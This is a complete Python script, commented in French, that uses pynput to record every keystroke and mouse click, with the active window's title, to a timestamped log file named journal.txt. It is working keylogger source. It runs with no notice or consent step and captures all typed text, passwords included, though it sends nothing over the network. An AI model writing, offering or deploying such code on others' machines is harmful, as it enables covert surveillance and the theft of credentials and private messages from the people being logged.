import datetime
import time
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import pygetwindow as gw

# Définir le fichier de journal
log_file = "journal.txt"

# Initialiser le suivi du temps pour les frappes consécutives
last_key_time = time.time()

# Fonction pour enregistrer l'action dans le journal
def log_action(action):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as file:
        file.write(f"{timestamp}: {action}\n")

# Fonction pour obtenir le nom de la fenêtre active (le logiciel)
def get_active_window():
    try:
        active_window = gw.getActiveWindow()
        if active_window is not None:
            return active_window.title
        else:
            return "Inconnu"
    except:
        return "Inconnu"

# Fonction de callback pour enregistrer les frappes
def on_key_event(key):
    global last_key_time
    current_time = time.time()
    key = str(key)
    if "Key." in key:
        key = key.split(".")[1]
    if current_time - last_key_time <= 0.5:
        log_action(f"Appui sur la touche {key}")
    else:
        log_action(f"Appui sur la touche {key} dans {get_active_window()}")
    last_key_time = current_time

# Fonction de callback pour enregistrer les clics de souris
def on_mouse_event(x, y, button, pressed):
    if pressed:
        log_action(f"Clic de souris sur le bouton {button} dans {get_active_window()}")

# Écouter les événements clavier en utilisant la bibliothèque pynput
with KeyboardListener(on_press=on_key_event) as keyboard_listener:
    # Écouter les événements de souris en utilisant la bibliothèque pynput
    with MouseListener(on_click=on_mouse_event) as mouse_listener:
        keyboard_listener.join()
        mouse_listener.join()
